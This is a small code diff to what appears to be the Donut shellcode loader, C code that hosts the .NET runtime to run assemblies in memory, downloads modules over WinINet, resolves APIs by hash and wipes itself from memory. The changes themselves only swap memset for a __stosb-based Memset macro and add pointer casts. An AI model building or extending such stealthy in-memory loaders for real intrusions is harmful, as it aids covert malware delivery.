@@ -33,7 +33,7 @@
 
 #if defined(_MSC_VER)
 #pragma intrinsic(memset)
-#define memset(x,y,z) __stosb(x,y,z)
+#define Memset(x,y,z) __stosb(x,y,z)
 #endif
 
 DWORD ThreadProc(LPVOID lpParameter) {
@@ -94,7 +94,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     FreeAssembly(inst, &assembly);
     
     // clear instance from memory
-    memset((PBYTE)inst, 0, inst->len);
+    Memset((PBYTE)inst, 0, inst->len);
     
     return 0;
 }
@@ -130,7 +130,7 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
       
         hr = pa->icmh->lpVtbl->GetRuntime(
           pa->icmh, mod->runtime, 
-          (REFIID)&inst->xIID_ICLRRuntimeInfo, &pa->icri);
+          (REFIID)&inst->xIID_ICLRRuntimeInfo, (LPVOID)&pa->icri);
         
         if(SUCCEEDED(hr)) {
           DPRINT("ICLRRuntimeInfo::IsLoadable");
@@ -142,7 +142,7 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
             hr = pa->icri->lpVtbl->GetInterface(
               pa->icri, 
               (REFCLSID)&inst->xCLSID_CorRuntimeHost, 
-              (REFIID)&inst->xIID_ICorRuntimeHost, &pa->icrh);
+              (REFIID)&inst->xIID_ICorRuntimeHost, (LPVOID)&pa->icrh);
               
             DPRINT("HRESULT: %08lx", hr);
           }
@@ -303,7 +303,7 @@ VOID FreeAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     if(inst->type == DONUT_INSTANCE_URL) {
       if(inst->module.p != NULL) {
         // overwrite with zeros
-        memset((PBYTE)inst->module.p, 0, (DWORD)inst->mod_len);
+        Memset((PBYTE)inst->module.p, 0, (DWORD)inst->mod_len);
         
         // free memory
         inst->api.VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
@@ -381,7 +381,7 @@ BOOL DownloadModule(PDONUT_INSTANCE inst) {
                   INTERNET_FLAG_RELOAD            |
                   INTERNET_FLAG_NO_AUTO_REDIRECT;
     
-    memset((void*)&uc, 0, sizeof(uc));
+    Memset((void*)&uc, 0, sizeof(uc));
     
     uc.dwStructSize     = sizeof(uc);
     uc.lpszHostName     = host;
@@ -677,7 +677,6 @@ LPVOID xGetProcAddress(PDONUT_INSTANCE inst, ULONG64 ulHash, ULONG64 ulIV) {
     }
     return addr;
 }
-
 
 // the following code is *only* for development purposes
 // given an instance file, it will run as if running on a target system
